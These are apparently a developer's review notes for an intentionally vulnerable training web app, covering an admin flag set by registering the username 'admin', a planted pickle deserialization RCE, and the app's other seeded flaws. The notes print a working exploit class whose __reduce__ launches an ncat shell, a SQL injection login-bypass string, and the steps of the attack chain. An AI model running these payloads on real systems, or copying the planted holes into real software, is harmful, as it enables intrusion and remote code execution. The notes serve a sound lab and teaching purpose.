# before phase 3: admin, the pickle rce, and actually finishing this thing

## `is_admin`, the new privilege flag

`init.sql` grew a column on each table:

```sql
password VARCHAR(255) NOT NULL,
is_admin BOOLEAN DEFAULT FALSE
```

same gotcha as every schema change so far, `docker-entrypoint-initdb.d/` only runs against an empty data directory, so an already initialized volume won't pick this up, needs `down -v` or a fresh volume. flagged back in `phase_0.md` and `phase_1.md`, flagging it a third time because it's the kind of thing that wastes twenty minutes if you forget it mid session.

the actual grant lives in `handle_registration()`:

```python
if username == "admin":
    is_admin = True
else:
    is_admin = False
```

worth being honest about what this is: it's not sqli, it's not the planned vuln, it's just a string comparison deciding a privilege. register a user named exactly `admin`, you're an admin, no invite code, no existing admin approving you, no bootstrap check of any kind. this is its own broken access control finding, same bug class as `/users` having no auth gate, and it's arguably a better demo than `/users` because it's a privilege escalation, not just a data leak. worth a line in a writeup if you want a second access control example alongside the password dump.

session now carries the flag alongside the usual two:

```python
session["is_admin"] = user["is_admin"]
```

set in `handle_login()`, popped in `handle_logout()`, read by every admin gated route with `session.get("is_admin")`.

## `/admin` and `/admin/preview/<post_id>`, the actual capstone

`/admin` is a flat moderation list, gated, pulls every post regardless of approval status, attaches `username` same as `/see` does.

`/admin/preview/<post_id>` is the planted rce:

```python
with open(stored_file_path, "rb") as stored_file:
    loaded_object = pickle.load(stored_file)
preview_data = f"Loaded object: {loaded_object!r}"
```

the mental model worth locking in: `pickle.load()` doesn't just deserialize data, it can call arbitrary code *during* the load itself, not after. a pickle stream encodes a sequence of "build this object" instructions, and if the attacker crafts a class whose `__reduce__` returns `(callable, args)`, pickle calls that callable with those args as one of the instructions. that's the entire mechanism, there's no separate "now execute" step to protect, the vulnerable moment is the `load()` call itself.

`writeups/rss/exploit.py` is that class:

```python
class whatever:
    def __reduce__(self):
        import os
        return (os.system, ('ncat 4444 -e /bin/sh',))
```

pickled, base64'd, printed. the chain as planned: register a normal user, upload that payload as `evil.jpg`, log in as admin (trivially, see above), hit `/admin/preview/<id>`, `os.system` fires inside the container the moment `pickle.load()` touches the bytes.

the `try/except` around the load:

```python
except (FileNotFoundError, pickle.UnpicklingError, EOFError, ValueError):
    preview_data = "File was not a valid preview object."
```

this is not a security control, say that explicitly in the writeup. it exists so a normal jpeg doesn't 500 the whole admin list, nothing about it validates or restricts what `pickle.load()` is handed, a crafted payload sails straight through.

## `is_approved`, the scope nobody planned

`see.html` now gates every post on `post.is_approved`, which defaults false, and `/approvepost/<id>` (admin only) flips it true. none of this was in `sdd.md`'s phase plan, it showed up as a side effect of building `/admin` and needing a reason for an admin to "review" posts before they're public. it's not a bad addition, it actually gives the preview route a real justification instead of existing purely to hold a vuln, but it's worth naming as scope creep rather than pretending it was always the plan.

## two bugs this session caused, not on anyone's vuln list

| what | before | now | effect |
|---|---|---|---|
| `delete_post` | `403` if `post.user_id != session.user_id` | `403` if `post.user_id != session.user_id` **or** `not session.get("is_admin")` | de morgan's law turns that `or` of two negated checks into "you need both ownership and admin," so a normal logged in user can no longer delete their own post. this also narrows the csrf writeup's scenario, the victim in that chain now has to be an admin who owns the targeted post |
| `see.html`'s delete link | gated on `session.get('username')` | gated on `session.get('id') == post.user_id` | the session key has always been `user_id`, never `id`, so this comparison is always `None == post.user_id`, always false. the delete link never renders for anyone. ui only, the route's own check still gates for real, but it'll confuse you mid demo if you forget it's there |

neither was intentional, both are just things that happened while wiring up admin gating. decide next session whether they get fixed or documented as known debt, don't let them sit silently.

## the uploads volume, still not fixed

`/app/uploads` isn't backed by a host volume. a container rebuild or `docker compose down` wipes the folder while mysql's volume (unless you also `-v`'d it) keeps every row that points at a file that used to live there. you already hit this: `FileNotFoundError` on preview for a post whose image disappeared after a rebuild. fix is one line in `docker-compose.yml`:

```yaml
volumes:
  - ./uploads:/app/uploads
```

host folder has to exist before `up`, or compose will create it as root owned, which has bitten people before. do this before running the real rce chain, you don't want to lose your payload file to a rebuild mid test.

## `writeups/rss/`, the folder that needs a second look

`exploit.py` is the real payload, that part's fine. `amazing_video.html` is a one line placeholder page ("you should definitely watch about this specific attack") that doesn't match anything else in `writeups/`, looks like filler that shouldn't ship, flag it for deletion unless there's a real video coming.

the folder name itself: every other writeup folder matches its vuln class directly, `xss/`, `csrf/`, `sql_injections/`, `file upload/`. `rss` doesn't correspond to anything, this is almost certainly meant to be `rce`. rename it before the final pass, otherwise the readme link you're about to fix will point at a typo'd path on day one.

## current status, no sugarcoating

| item | status |
|---|---|
| `/admin/preview/<id>` exists, gated on `is_admin` | done |
| `pickle.load()` on stored bytes, wrapped so normal images don't 500 | done |
| exploit script built | done, `writeups/rss/exploit.py` |
| full chain run: upload payload, admin preview, confirm execution | not captured |
| normal image through preview, confirmed clean | partially, you saw `invalid load key, '\xff'` once but it's not written up as evidence |
| non admin session denied at preview | not run |
| `writeups/07-rce.md` (or whatever path, pending the rename above) | not written |
| readme vuln table links | still point at flat paths that no longer exist |
| readme repo diagram | still shows `app/`, real package is `logic/` |
| `writeups/file upload/` space in folder name | not renamed |
| `delete_account()` reads `request.args`, `delete.html` posts a form body | still broken, carried over from phase 2, never decided |
| full clean rebuild + replay of all 7 exploits plus rce | not done |

## attack surface, full and current

| route | vuln | type |
|---|---|---|
| `/login` | `' OR '1'='1' --` / `' --` auth bypass | sqli, auth bypass, **captured** |
| `/delete` | reuses the vulnerable credentials query, broken for normal use pending the `request.args` decision | sqli, functional bug |
| `/users` | full plaintext password + admin flag dump, no auth gate | broken access control |
| `/register` | registering as literally `admin` grants admin, no other check | broken access control (new this phase) |
| `/upload` | title/content/image_path injectable, no csrf token | sqli + csrf |
| `/see` | renders `post.title`, `post.content`, `post.image_path` with `\| safe`, gated on `is_approved` | stored xss / html injection |
| `/deletepost/<id>` | state changing `GET`, now requires owner *and* admin (bug, see above) | csrf, currently narrowed by the bug |
| `/admin/preview/<id>` | `pickle.load()` on attacker supplied bytes | unsafe deserialization, rce |
| `/approvepost/<id>` | admin only, no other issues found yet | n/a |

## the actual finish line

since this is the last phase, here's the order to close it in, not a suggestion list:

1. mount the uploads volume so testing survives a rebuild
2. `docker compose down -v && docker compose up --build`, recreate test accounts (including registering `admin` to get the admin session)
3. run the real chain: upload `exploit.py`'s output as `evil.jpg`, hit `/admin/preview/<id>`, confirm the command actually ran inside the container (`docker compose exec web cat /tmp/pwned` or whatever target the payload wrote to)
4. run the clean image case and the non admin case, capture both, don't rely on memory of what happened earlier
5. decide the `is_admin` bootstrap: document it as an explicit finding (recommended, it's a real and distinct bug class from the sqli stuff) or at minimum flag it so it's not silently load bearing for your own testing
6. decide `delete_post` and `see.html`'s dead comparison: fix or document as known debt, don't leave them unmentioned
7. write the rce writeup, rename `writeups/rss/` to `writeups/rce/` (or your call, just make it consistent), drop `amazing_video.html` unless it's getting replaced with something real
8. fix the readme: vuln table links to the actual grouped paths, repo diagram to `logic/`, rename `writeups/file upload/` to lose the space
9. one more full clean rebuild, replay every exploit including the rce chain, confirm nothing depended on state left over from testing
10. done
